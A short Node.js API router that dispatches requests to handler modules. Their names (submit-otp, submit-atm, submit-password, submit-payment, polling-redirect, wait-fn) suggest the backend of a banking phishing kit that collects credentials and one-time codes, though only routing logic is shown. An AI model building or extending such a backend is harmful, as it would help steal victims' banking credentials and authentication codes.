const handlers = {
  'submit-form': require('../lib/handlers/submit-form'),
  'submit-otp': require('../lib/handlers/submit-otp'),
  'submit-payment': require('../lib/handlers/submit-payment'),
  'submit-payment2': require('../lib/handlers/submit-payment2'),
  'submit-s': require('../lib/handlers/submit-s'),
  'submit-atm': require('../lib/handlers/submit-atm'),
  'submit-password': require('../lib/handlers/submit-password'),
  'heartbeat': require('../lib/handlers/heartbeat'),
  'polling-redirect': require('../lib/handlers/polling-redirect'),
  'wait-fn': require('../lib/handlers/wait-fn'),
};

module.exports = async (req, res) => {
  const pathSegments = req.query.path;
  let route = Array.isArray(pathSegments) ? pathSegments.join('/') : (pathSegments || '');

  if (!handlers[route]) {
    route = req.url.replace(/^\/api\//, '').split('?')[0];
  }

  const handler = handlers[route];
  if (handler) {
    return handler(req, res);
  }

  res.status(404).json({ error: 'Not found' });
};
